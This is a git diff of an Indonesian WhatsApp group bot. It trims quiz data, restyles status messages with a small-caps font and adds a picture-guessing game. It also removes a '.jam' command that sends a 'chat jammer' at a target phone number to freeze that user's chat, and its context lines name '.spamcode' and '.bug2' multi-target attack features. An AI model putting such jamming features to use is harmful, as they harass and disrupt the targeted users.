-  pertanyaan: "Benda yang sering ada di kantong?",
-  jawaban: ["uang", "kunci", "hp", "tisu", "koin"]
-},
-{
-  pertanyaan: "Kalau ke pasar, orang biasanya beli apa?",
-  jawaban: ["sayur", "ikan", "buah", "daging", "bumbu"]
-},
-{
-  pertanyaan: "Kalau bangun kesiangan, yang sering dilewatin?",
-  jawaban: ["sarapan", "mandi", "rapihin kamar", "beresin kasur", "doa"]
-},
-{
-  pertanyaan: "Kalau hujan-hujanan, yang biasanya basah duluan?",
-  jawaban: ["baju", "sepatu", "rambut", "celana", "tas"]
-},
-{
-  pertanyaan: "Kalau di rumah sepi, biasanya ngapain?",
-  jawaban: ["tidur", "nonton", "denger musik", "rebahan", "keluar"]
-},
-{
-  pertanyaan: "Hewan yang sering bikin jijik?",
-  jawaban: ["kecoa", "cacing", "tikus", "lintah", "ulat"]
-},
-{
-  pertanyaan: "Kalau lagi sakit, yang paling sering diminta?",
-  jawaban: ["istirahat", "obat", "air", "selimut", "makanan"]
-},
-
-{
-  pertanyaan: "Pelajaran yang sering bikin pusing di sekolah?",
-  jawaban: ["matematika", "fisika", "kimia", "akuntansi", "statistika"]
-},
-{
-  pertanyaan: "Alasan siswa dimarahi guru?",
-  jawaban: ["ribut", "telat", "tidak ngerjain tugas", "main hp", "tidur"]
-},
-{
-  pertanyaan: "Barang yang sering ada di tas sekolah?",
-  jawaban: ["buku", "pulpen", "pensil", "penghapus", "botol minum"]
-},
-{
-  pertanyaan: "Hal yang sering dilakukan saat pelajaran membosankan?",
-  jawaban: ["melamun", "gambar", "tidur", "main hp", "ngobrol"]
-},
-{
-  pertanyaan: "Tempat yang sering dikunjungi setelah pulang sekolah?",
-  jawaban: ["rumah", "warung", "kantin", "tempat les", "rumah teman"]
-},
-{
-  pertanyaan: "Alasan orang tidak masuk sekolah?",
-  jawaban: ["sakit", "ijin", "ketiduran", "malas", "acara keluarga"]
-},
-{
-  pertanyaan: "Hal yang sering terjadi saat ujian?",
-  jawaban: ["deg-degan", "lupa jawaban", "nyontek", "ngantuk", "panik"]
-},
-{
-  pertanyaan: "Barang yang sering dipinjam di kelas?",
-  jawaban: ["pulpen", "penghapus", "penggaris", "buku", "kertas"]
-},
-{
-  pertanyaan: "Hal yang sering dilakukan guru di kelas?",
-  jawaban: ["ngajar", "marah", "nanya", "nulis", "ceramah"]
-},
-{
-  pertanyaan: "Alasan PR tidak dikerjakan?",
-  jawaban: ["lupa", "tidak paham", "ketiduran", "malas", "banyak tugas"]
-},
-{
-  pertanyaan: "Pekerjaan yang sering ditemui di sekitar rumah?",
-  jawaban: ["pedagang", "satpam", "tukang", "ojek", "penjual makanan"]
-},
-{
-  pertanyaan: "Alasan orang bekerja?",
-  jawaban: ["uang", "kebutuhan", "tanggung jawab", "keluarga", "pengalaman"]
-},
-{
-  pertanyaan: "Hal yang sering dilakukan saat istirahat kerja?",
-  jawaban: ["makan", "minum", "main hp", "ngobrol", "rokok"]
-},
-{
-  pertanyaan: "Barang yang sering ada di meja kerja?",
-  jawaban: ["komputer", "pulpen", "kertas", "hp", "minuman"]
-},
-{
-  pertanyaan: "Tempat yang sering bikin capek?",
-  jawaban: ["kantor", "sekolah", "jalan", "pabrik", "pasar"]
-},
-{
-  pertanyaan: "Alasan orang berhenti kerja?",
-  jawaban: ["capek", "gaji kecil", "lingkungan", "kontrak habis", "pindah"]
-},
-{
-  pertanyaan: "Tempat yang biasanya ramai pagi hari?",
-  jawaban: ["sekolah", "pasar", "jalan", "terminal", "kantor"]
-},
-{
-  pertanyaan: "Benda yang sering ditemukan di rumah orang tua?",
-  jawaban: ["lemari", "kursi", "jam dinding", "kipas", "tv"]
-},
-{
-  pertanyaan: "Hal yang sering dilakukan orang tua di rumah?",
-  jawaban: ["nonton tv", "masak", "bersih-bersih", "ngobrol", "tidur"]
-},
-{
-  pertanyaan: "Benda yang sering rusak di rumah?",
-  jawaban: ["remote", "kipas", "charger", "lampu", "stop kontak"]
-},
-{
-  pertanyaan: "Tempat yang sering bikin orang ngantri?",
-  jawaban: ["bank", "kasir", "atm", "rumah sakit", "kantin"]
-},
-{
-  pertanyaan: "Hal yang sering bikin orang sabar?",
-  jawaban: ["nunggu", "ngalah", "diam", "doa", "menahan emosi"]
-},
-{
-  pertanyaan: "Hal yang sering bikin orang kesel?",
-  jawaban: ["nunggu lama", "dibohongi", "diganggu", "macet", "disalahkan"]
-},
-{
-  pertanyaan: "Barang yang sering ada di ruang tamu?",
-  jawaban: ["sofa", "kursi", "meja", "tv", "karpet"]
-},
-{
-  pertanyaan: "Tempat yang sering didatangi saat akhir pekan?",
-  jawaban: ["rumah", "mall", "tempat makan", "pasar", "rumah keluarga"]
-}
-
-
-
-];
-
-
-
-// Database bendera (100+ negara, contoh sebagian)
-const soalBendera = [
-    { soal: "🇮🇩", jawaban: "indonesia" },
-    { soal: "🇲🇾", jawaban: "malaysia" },
-    { soal: "🇸🇬", jawaban: "singapura" },
-    { soal: "🇧🇳", jawaban: "brunei" },
-    { soal: "🇹🇭", jawaban: "thailand" },
-    { soal: "🇻🇳", jawaban: "vietnam" },
-    { soal: "🇵🇭", jawaban: "filipina" },
-    { soal: "🇲🇲", jawaban: "myanmar" },
-    { soal: "🇰🇭", jawaban: "kamboja" },
-    { soal: "🇱🇦", jawaban: "laos" },
-    { soal: "🇨🇳", jawaban: "cina" },
-    { soal: "🇯🇵", jawaban: "jepang" },
-    { soal: "🇰🇷", jawaban: "korea selatan" },
-    { soal: "🇰🇵", jawaban: "korea utara" },
-    { soal: "🇮🇳", jawaban: "india" },
-    { soal: "🇵🇰", jawaban: "pakistan" },
-    { soal: "🇧🇩", jawaban: "bangladesh" },
-    { soal: "🇳🇵", jawaban: "nepal" },
-    { soal: "🇱🇰", jawaban: "sri lanka" },
-    { soal: "🇧🇹", jawaban: "bhutan" },
-    { soal: "🇲🇻", jawaban: "maladewa" },
-    { soal: "🇸🇦", jawaban: "arab saudi" },
-    { soal: "🇦🇪", jawaban: "uni emirat arab" },
-    { soal: "🇶🇦", jawaban: "qatar" },
-    { soal: "🇰🇼", jawaban: "kuwait" },
-    { soal: "🇧🇭", jawaban: "bahrain" },
-    { soal: "🇴🇲", jawaban: "oman" },
-    { soal: "🇮🇷", jawaban: "iran" },
-    { soal: "🇮🇶", jawaban: "irak" },
-    { soal: "🇹🇷", jawaban: "turki" },
-    { soal: "🇮🇱", jawaban: "israel" },
-    { soal: "🇵🇸", jawaban: "palestina" },
-    { soal: "🇪🇬", jawaban: "mesir" },
-    { soal: "🇿🇦", jawaban: "afrika selatan" },
-    { soal: "🇳🇬", jawaban: "nigeria" },
-    { soal: "🇰🇪", jawaban: "kenya" },
-    { soal: "🇹🇿", jawaban: "tanzania" },
-    { soal: "🇪🇹", jawaban: "ethiopia" },
-    { soal: "🇲🇦", jawaban: "maroko" },
-    { soal: "🇩🇿", jawaban: "aljazair" },
-    { soal: "🇹🇳", jawaban: "tunisia" },
-    { soal: "🇱🇾", jawaban: "libya" },
-    { soal: "🇸🇩", jawaban: "sudan" },
-    { soal: "🇫🇷", jawaban: "prancis" },
-    { soal: "🇩🇪", jawaban: "jerman" },
-    { soal: "🇮🇹", jawaban: "italia" },
-    { soal: "🇪🇸", jawaban: "spanyol" },
-    { soal: "🇬🇧", jawaban: "inggris" },
-    { soal: "🇷🇺", jawaban: "rusia" },
-    { soal: "🇺🇦", jawaban: "ukraina" },
-    { soal: "🇵🇱", jawaban: "polandia" },
-    { soal: "🇷🇴", jawaban: "romania" },
-    { soal: "🇬🇷", jawaban: "yunani" },
-    { soal: "🇧🇷", jawaban: "brasil" },
-    { soal: "🇦🇷", jawaban: "argentina" },
-    { soal: "🇨🇱", jawaban: "chile" },
-    { soal: "🇵🇪", jawaban: "peru" },
-    { soal: "🇨🇴", jawaban: "kolombia" },
-    { soal: "🇲🇽", jawaban: "meksiko" },
-    { soal: "🇺🇸", jawaban: "amerika serikat" },
-    { soal: "🇨🇦", jawaban: "kanada" },
-    { soal: "🇦🇺", jawaban: "australia" },
-    { soal: "🇳🇿", jawaban: "selandia baru" },
-    // ... tambah sampai 100++
-];
 
 
 const userCooldownMap = new Map(); // Map<JID, timestamp>
@@ -2510,6 +1287,10 @@ sock.ev.on('messages.upsert', async ({ messages }) => {
             msg.message?.documentMessage?.mimetype?.includes("image") && msg.message.documentMessage ||
             msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage
         );
+        
+                // ✅ FITUR TEBAK-AKU
+    const textMessage = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
+
 
         if (!msg.key.fromMe) {
     tambahXP(sock, sender, from);
@@ -2531,6 +1312,36 @@ sock.ev.on('messages.upsert', async ({ messages }) => {
     if (status === 'false') grupAktif.set(from, false);
 }
 
+// FUNGSI FONT GLOBAL - Taruh di bagian atas file atau di scope yang sama
+const toSmallCaps = (text) => {
+    const smallCapsMap = {
+        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ',
+        'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ', 'J': 'ᴊ',
+        'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ',
+        'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ', 'S': 'ꜱ', 'T': 'ᴛ',
+        'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ',
+        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ',
+        'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ',
+        'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ',
+        'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ',
+        'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
+        '0': '𝟎', '1': '𝟏', '2': '𝟐', '3': '𝟑', '4': '𝟒',
+        '5': '𝟓', '6': '𝟔', '7': '𝟕', '8': '𝟖', '9': '𝟗',
+        ' ': ' ', ':': ':', '-': '-', '/': '/', '.': '.', ',': ',',
+        '!': '!', '?': '?', '@': '@', '#': '#', '$': '$', '%': '%',
+        '&': '&', '*': '*', '+': '+', '=': '=', '(': '(', ')': ')',
+        '[': '[', ']': ']', '{': '{', '}': '}', '<': '<', '>': '>',
+        '|': '|', '\\': '\\', '"': '"', "'": "'", '`': '`', '~': '~',
+        '^': '^', ';': ';'
+    };
+    
+    return text.split('').map(char => smallCapsMap[char] || char).join('');
+};
+
+const font = (str) => toSmallCaps(str);
+
+
+// ==================== .ON COMMAND ====================
 if (text.trim() === '.on') {
     if (!from.endsWith('@g.us')) return;
 
@@ -2541,14 +1352,14 @@ if (text.trim() === '.on') {
 
     if (!isRealOwner) {
         await sock.sendMessage(from, {
-            text: '❌ Hanya orang yang punya kemampuan *surgawi* yang bisa aktifin bot ini.'
+            text: font('❌ ʜᴀɴʏᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴘᴜɴʏᴀ ᴋᴇᴍᴀᴍᴘᴜᴀɴ ꜱᴜʀɢᴀᴡɪ ʏᴀɴɢ ʙɪꜱᴀ ᴀᴋᴛɪꜰɪɴ ʙᴏᴛ ɪɴɪ.')
         });
         return;
     }
 
     if (grupAktif.get(from) === true) {
         await sock.sendMessage(from, {
-            text: '⚙️ *Bot Sudah Aktif*\n\n🟢 Status saat ini: *ON*'
+            text: font('⚙️ ʙᴏᴛ ꜱᴜᴅᴀʜ ᴀᴋᴛɪꜰ\n\n🟢 ꜱᴛᴀᴛᴜꜱ ꜱᴀᴀᴛ ɪɴɪ: ᴏɴ')
         });
         return;
     }
@@ -2567,17 +1378,17 @@ if (text.trim() === '.on') {
     });
 
     await sock.sendMessage(from, {
-        text: `✅ *BOT DIAKTIFKAN*
+        text: font(`✅ ʙᴏᴛ ᴅɪᴀᴋᴛɪꜰᴋᴀɴ
 ━━━━━━━━━
-🟢 Status: *ON*
-📅 Waktu: ${waktu}
+🟢 ꜱᴛᴀᴛᴜꜱ: ᴏɴ
+📅 ᴡᴀᴋᴛᴜ: ${waktu}
 
-👑 Owner: @${OWNER_NUMBER.split('@')[0]}`,
-        mentions: [OWNER_NUMBER]
+👑 ᴏᴡɴᴇʀ: ꜰᴀᴊᴀʀ`)
     });
     return;
 }
 
+// ==================== .OFF COMMAND ====================
 if (text.trim() === '.off') {
     if (!from.endsWith('@g.us')) return;
 
@@ -2588,14 +1399,14 @@ if (text.trim() === '.off') {
 
     if (!isRealOwner) {
         await sock.sendMessage(from, {
-            text: '❌ Yaelah aktifin aja gabisa, ini malah mau matiin lawak.'
+            text: font('❌ ʏᴀᴇʟᴀʜ ᴀᴋᴛɪꜰɪɴ ᴀᴊᴀ ɢᴀʙɪꜱᴀ, ɪɴɪ ᴍᴀʟᴀʜ ᴍᴀᴜ ᴍᴀᴛɪɪɴ ʟᴀᴡᴀᴋ.')
         });
         return;
     }
 
     if (grupAktif.get(from) === false) {
         await sock.sendMessage(from, {
-            text: '⚙️ *Bot Sudah Nonaktif*\n\n🔴 Status saat ini: *OFF*'
+            text: font('⚙️ ʙᴏᴛ ꜱᴜᴅᴀʜ ɴᴏɴᴀᴋᴛɪꜰ\n\n🔴 ꜱᴛᴀᴛᴜꜱ ꜱᴀᴀᴛ ɪɴɪ: ᴏꜰꜰ')
         });
         return;
     }
@@ -2614,22 +1425,20 @@ if (text.trim() === '.off') {
     });
 
     await sock.sendMessage(from, {
-        text: `🔴 *BOT DIMATIKAN*
+        text: font(`🔴 ʙᴏᴛ ᴅɪᴍᴀᴛɪᴋᴀɴ
 ━━━━━━━━━
-📅 Waktu: ${waktu}
+📅 ᴡᴀᴋᴛᴜ: ${waktu}
 
-👑 Owner: @${OWNER_NUMBER.split('@')[0]}`,
-        mentions: [OWNER_NUMBER]
+👑 ᴏᴡɴᴇʀ: ꜰᴀᴊᴀʀ`)
     });
     return;
 }
 
-
-// .setoff <angka> <satuan>
+// ==================== .SETOFF COMMAND ====================
 if (body.startsWith('.setoff') && isGroup) {
     if (!isOwner(sender)) {
         await sock.sendMessage(from, {
-            text: '❌ Hanya *Owner* yang bisa menggunakan perintah ini.'
+            text: font('❌ ʜᴀɴʏᴀ ᴏᴡɴᴇʀ ʏᴀɴɢ ʙɪꜱᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ.')
         }, { quoted: msg });
         return;
     }
@@ -2640,7 +1449,7 @@ if (body.startsWith('.setoff') && isGroup) {
 
     if (!jumlah || isNaN(jumlah) || jumlah <= 0) {
         await sock.sendMessage(from, {
-            text: '⚠️ Format salah.\n\nGunakan: *.setoff <angka> <satuan>*\nContoh:\n• *.setoff 1 jam*\n• *.setoff 5 menit*\n• *.setoff 30 detik*'
+            text: font('⚠️ ꜰᴏʀᴍᴀᴛ ꜱᴀʟᴀʜ.\n\nɢᴜɴᴀᴋᴀɴ: .ꜱᴇᴛᴏꜰꜰ <ᴀɴɢᴋᴀ> <ꜱᴀᴛᴜᴀɴ>\nᴄᴏɴᴛᴏʜ:\n• .ꜱᴇᴛᴏꜰꜰ 𝟏 ᴊᴀᴍ\n• .ꜱᴇᴛᴏꜰꜰ 𝟱 ᴍᴇɴɪᴛ\n• .ꜱᴇᴛᴏꜰꜰ 𝟯𝟬 ᴅᴇᴛɪᴋ')
         }, { quoted: msg });
         return;
     }
@@ -2654,7 +1463,7 @@ if (body.startsWith('.setoff') && isGroup) {
         ms = jumlah * 1000;
     } else {
         await sock.sendMessage(from, {
-            text: '❌ Satuan waktu tidak dikenal. Gunakan *jam*, *menit*, atau *detik*.'
+            text: font('❌ ꜱᴀᴛᴜᴀɴ ᴡᴀᴋᴛᴜ ᴛɪᴅᴀᴋ ᴅɪᴋᴇɴᴀʟ. ɢᴜɴᴀᴋᴀɴ ᴊᴀᴍ, ᴍᴇɴɪᴛ, ᴀᴛᴀᴜ ᴅᴇᴛɪᴋ.')
         }, { quoted: msg });
         return;
     }
@@ -2677,8 +1486,7 @@ if (body.startsWith('.setoff') && isGroup) {
 
     // Konfirmasi ke grup
     await sock.sendMessage(from, {
-        text: `⏳ *Timer Bot OFF*\n\n🕒 Durasi: *${jumlah} ${satuan}*\n📅 Bot akan mati pada:\n👉 ${formatWaktu}\n\n👑 Owner: @${OWNER_NUMBER.split('@')[0]}`,
-        mentions: [OWNER_NUMBER]
+        text: font(`⏳ ᴛɪᴍᴇʀ ʙᴏᴛ ᴏꜰꜰ\n\n🕒 ᴅᴜʀᴀꜱɪ: ${jumlah} ${satuan}\n📅 ʙᴏᴛ ᴀᴋᴀɴ ᴍᴀᴛɪ ᴘᴀᴅᴀ:\n👉 ${formatWaktu}\n\n👑 ᴏᴡɴᴇʀ ꜰᴀᴊᴀʀ`)
     }, { quoted: msg });
 
     // Jalankan timer
@@ -2687,8 +1495,7 @@ if (body.startsWith('.setoff') && isGroup) {
         simpanGrupAktif();
 
         await sock.sendMessage(from, {
-            text: `🔴 *Bot Dimatikan Otomatis*\n\n📅 Waktu: ${formatWaktu}\n⏰ Durasi: *${jumlah} ${satuan}*\n\n👑 Owner: @${OWNER_NUMBER.split('@')[0]}`,
-            mentions: [OWNER_NUMBER]
+            text: font(`🔴 ʙᴏᴛ ᴅɪᴍᴀᴛɪᴋᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ\n\n📅 ᴡᴀᴋᴛᴜ: ${formatWaktu}\n⏰ ᴅᴜʀᴀꜱɪ: ${jumlah} ${satuan}\n\n👑 ᴏᴡɴᴇʀ: ꜰᴀᴊᴀʀ`)
         });
     }, ms);
 }
@@ -4550,9 +3357,6 @@ if (text.startsWith('.unmute')) {
     }
 }
 
-                // ✅ FITUR TEBAK-AKU
-    const textMessage = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
-
     if (textMessage.toLowerCase() === '.tebak-aku') {
     const soal = ambilSoalAcak('tebakaku', soalTebakan);
 
@@ -4590,6 +3394,86 @@ if (msg.message?.extendedTextMessage?.contextInfo?.stanzaId) {
         } else {
             await sock.sendMessage(from, {
                 text: `❌ *Salah!* Jawabanmu: *${userAnswer}*\n✅ Jawaban benar: *${sesi.jawaban}*\n\nCoba lagi? Ketik *.tebak-aku*`
+            });
+        }
+        return;
+    }
+}
+
+
+
+// Handler untuk command .tebakgambar
+if (text.trim() === '.tebakgambar') {
+    await sock.sendMessage(from, { react: { text: '🧩', key: msg.key } });
+
+    // Cek apakah ada soal
+    if (tebakgambar.length === 0) {
+        return sock.sendMessage(from, {
+            text: '❌ Soal tebak gambar belum tersedia.'
+        });
+    }
+
+    // Ambil soal secara acak
+    const randomIndex = Math.floor(Math.random() * tebakgambar.length);
+    const soal = tebakgambar[randomIndex];
+
+    const sent = await sock.sendMessage(from, {
+        image: { url: soal.img },
+        caption: `🧩 *TEBAK GAMBAR DIMULAI!*
+
+📌 *Petunjuk:* ${soal.deskripsi || '-'}
+
+✍️ Jawab dengan menuliskan jawaban
+(dengan mereply gambar ini)
+⏱️ Waktu 30 detik!`
+    });
+
+    const timeout = setTimeout(async () => {
+        sesiTebakGambar.delete(sent.key.id);
+        await sock.sendMessage(from, {
+            text: `⏰ *Waktu habis!*
+
+✅ Jawaban yang benar adalah:
+*${soal.jawaban}*`
+        });
+    }, 30000);
+
+    sesiTebakGambar.set(sent.key.id, {
+        jawaban: soal.jawaban.trim(),
+        timeout,
+        index: soal.index
+    });
+
+    return;
+}
+
+// Handler untuk reply jawaban (tetap sama)
+if (msg.message?.extendedTextMessage?.contextInfo?.stanzaId) {
+    const replyId = msg.message.extendedTextMessage.contextInfo.stanzaId;
+
+    if (sesiTebakGambar.has(replyId)) {
+        const sesi = sesiTebakGambar.get(replyId);
+        clearTimeout(sesi.timeout);
+        sesiTebakGambar.delete(replyId);
+
+        const jawabanUser = text.trim();
+        const benar = jawabanUser.toLowerCase() === sesi.jawaban.toLowerCase();
+
+        if (benar) {
+            tambahSkor(sender, from, 30);
+            await sock.sendMessage(from, {
+                text: `✅ *Benar!* Jawabanmu adalah *${sesi.jawaban}* 🎉
+🏆 Kamu mendapatkan *+30 poin!*
+
+Mau main lagi? Ketik *.tebakgambar*`
+            });
+        } else {
+            await sock.sendMessage(from, {
+                text: `❌ *Salah!*
+Jawabanmu: *${jawabanUser}*
+✅ Jawaban benar: *${sesi.jawaban}*
+
+Ketik *.tebakgambar* untuk mencoba lagi.`
             });
         }
         return;
@@ -6395,74 +5279,6 @@ if (text.startsWith('.spamcode')) {
 }
 
 
-if (body.startsWith('.jam')) {
-    const args = body.trim().split(' ');
-    
-    if (!jammer) {
-        jammer = new RealChatJammer(sock);
-    }
-    
-    if (args.length === 1) {
-        await sock.sendMessage(from, {
-            text: `💀 REAL CHAT JAMMER\n\n.jam 628xxx [duration]\n.jam status\n.jam stop [id]\n\nDurasi: detik (default: 120)`
-        });
-        return;
-    }
-    
-    if (args[1] === 'status') {
-        const active = jammer.getActiveJams();
-        if (active.length === 0) {
-            await sock.sendMessage(from, { text: 'No active jams' });
-        } else {
-            let text = `Active: ${active.length}\n`;
-            active.forEach(j => {
-                text += `\n${j.target}\nID: ${j.id}\nRemaining: ${j.remaining}s\nSent: ${j.sent}`;
-            });
-            await sock.sendMessage(from, { text });
-        }
-        return;
-    }
-    
-    if (args[1] === 'stop') {
-        if (args[2]) {
-            const stopped = jammer.stopJam(args[2]);
-            await sock.sendMessage(from, { 
-                text: stopped ? '✅ Stopped' : '❌ Not found' 
-            });
-        } else {
-            const active = jammer.getActiveJams();
-            active.forEach(j => jammer.stopJam(j.id));
-            await sock.sendMessage(from, { 
-                text: `Stopped ${active.length} jams` 
-            });
-        }
-        return;
-    }
-    
-    // START JAM
-    let target = args[1].replace(/[^0-9]/g, '');
-    if (!target) {
-        await sock.sendMessage(from, { text: 'Invalid number' });
-        return;
-    }
-    
-    if (target.startsWith('0')) target = '62' + target.slice(1);
-    if (!target.startsWith('62')) target = '62' + target;
-    
-    let duration = 120;
-    if (args[2]) {
-        duration = parseInt(args[2]);
-        if (isNaN(duration) || duration < 30) duration = 120;
-        if (duration > 300) duration = 300;
-    }
-    
-    const targetJid = target + '@s.whatsapp.net';
-    const jamId = await jammer.jamChat(targetJid, duration);
-    
-    await sock.sendMessage(from, {
-        text: `💀 JAM STARTED\n\nTarget: ${target}\nDuration: ${duration}s\nID: ${jamId}\n\nChat will freeze/lag`
-    });
-}
 
 
 // 🎯 FITUR .bug2 (MULTI-TARGET ATTACK)
@@ -8585,8 +7401,6 @@ if (text.trim() === '.info') {
     await sock.sendMessage(from, { text: teks }, { quoted: msg });
     return;
 }
-
-// ==================== FANCY MENU WITH BOLD FONT ====================
 if (text.trim() === '.menu') {
     await sock.sendMessage(from, {
         react: {
@@ -8600,211 +7414,165 @@ if (text.trim() === '.menu') {
     const bulan = (waktu.getMonth() + 1).toString().padStart(2, '0');
     const tahun = waktu.getFullYear().toString();
     
-    // FONT CONVERTER
-    const toBoldFont = (text) => {
-        const boldMap = {
-            'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘',
-            'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝',
-            'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢',
-            'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧',
-            'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭',
-            'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲',
-            'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷',
-            'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼',
-            'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁',
-            'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
-            '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
-            '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵',
-            ' ': ' ', ':': ':', '-': '-', '/': '/', '.': '.', ',': ',',
-            '!': '!', '?': '?', '@': '@', '#': '#', '$': '$',
-            '(': '(', ')': ')', '[': '[', ']': ']', '{': '{', '}': '}'
-        };
-        
-        return text.split('').map(char => boldMap[char] || char).join('');
-    };
-    
-    const toSmallCaps = (text) => {
-        const smallCapsMap = {
-            'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ',
-            'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ', 'J': 'ᴊ',
-            'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ',
-            'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ', 'S': 'ꜱ', 'T': 'ᴛ',
-            'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ',
-            'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ',
-            'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ',
-            'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ',
-            'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ',
-            'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ'
-        };
-        
-        return text.split('').map(char => smallCapsMap[char] || char).join('');
-    };
-    
-    // CONVERT TEXTS
-    const boldText = (str) => toBoldFont(str);
-    const smallText = (str) => toSmallCaps(str);
-    
-    const versiBold = boldText("1.5.0");
-    const tanggalBold = boldText(`${tanggal}-${bulan}-${tahun}`);
+    const versi = font("1.5.0");
+    const tanggalFormat = font(`${tanggal}-${bulan}-${tahun}`);
     const readmore = String.fromCharCode(8206).repeat(4001);
     
     await sock.sendMessage(from, {
         image: { url: './logo.png' },
-        caption: boldText(`𝐒𝐄𝐋𝐀𝐌𝐀𝐓 𝐃𝐀𝐓𝐀𝐍𝐆
+        caption: font(`ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ
 
-> 𝐍𝐀𝐌𝐀          : ${boldText("𝐁𝐎𝐓 𝐉𝐀𝐑𝐑")}
-> 𝐀𝐔𝐓𝐎𝐑        : ${boldText("𝐅𝐀𝐉𝐀𝐑")}
-> 𝐕𝐄𝐑𝐒𝐈          : ${versiBold}
-> 𝐓𝐀𝐍𝐆𝐆𝐀𝐋    : ${tanggalBold}
+> ɴᴀᴍᴀ          : ʙᴏᴛ ᴊᴀʀʀ
+> ᴀᴜᴛᴏʀ        : ꜰᴀᴊᴀʀ
+> ᴠᴇʀꜱɪ          : ${versi}
+> ᴛᴀɴɢɢᴀʟ    : ${tanggalFormat}
 
-${readmore}╭─〔 ${boldText("🤖 𝐁𝐎𝐓 𝐉𝐀𝐑𝐑 𝐌𝐄𝐍𝐔")} 〕─╮
+${readmore}╭─〔 🤖 ʙᴏᴛ ᴊᴀʀʀ ᴍᴇɴᴜ 〕─╮
 │
-├─ 〔 ${boldText("🎮 𝐆𝐀𝐌𝐄")} 〕
-│ ${smallText(".kuis")} → ${boldText("𝐊𝐮𝐢𝐬 𝐩𝐢𝐥𝐢𝐡𝐚𝐧 𝐠𝐚𝐧𝐝𝐚")}
-│ ${smallText(".kuissusah")} → ${boldText("𝐊𝐮𝐢𝐬 𝐯𝐞𝐫𝐬𝐢 𝐬𝐮𝐬𝐚𝐡")}
-│ ${smallText(".judi")} → ${boldText("𝐓𝐞𝐛𝐚𝐤 𝐠𝐚𝐧𝐣𝐢𝐥 / 𝐠𝐞𝐧𝐚𝐩")}
-│ ${smallText(".truth")} → ${boldText("𝐉𝐚𝐰𝐚𝐛 𝐣𝐮𝐣𝐮𝐫")}
-│ ${smallText(".dare")} → ${boldText("𝐋𝐚𝐤𝐮𝐤𝐚𝐧 𝐭𝐚𝐧𝐭𝐚𝐧𝐠𝐚𝐧")}
-│ ${smallText(".tebak-aku")} → ${boldText("𝐓𝐞𝐛𝐚𝐤𝐚𝐧 𝐥𝐮𝐜𝐮")}
-│ ${smallText(".tebaklagu")} → ${boldText("𝐌𝐞𝐧𝐞𝐛𝐚𝐤 𝐥𝐚𝐠𝐮")}
-│ ${smallText(".tebakgambar")} → ${boldText("𝐌𝐞𝐧𝐞𝐛𝐚𝐤 𝐠𝐚𝐦𝐛𝐚𝐫")}
-│ ${smallText(".susunkata")} → ${boldText("𝐒𝐮𝐬𝐮𝐧 𝐡𝐮𝐫𝐮𝐟")}
-│ ${smallText(".family100")} → ${boldText("𝐉𝐚𝐰𝐚𝐛𝐚𝐧 𝐭𝐞𝐫𝐛𝐚𝐧𝐲𝐚𝐤")}
-│ ${smallText(".tebakbendera")} → ${boldText("𝐌𝐞𝐧𝐞𝐛𝐚𝐤 𝐛𝐞𝐧𝐝𝐞𝐫𝐚")}
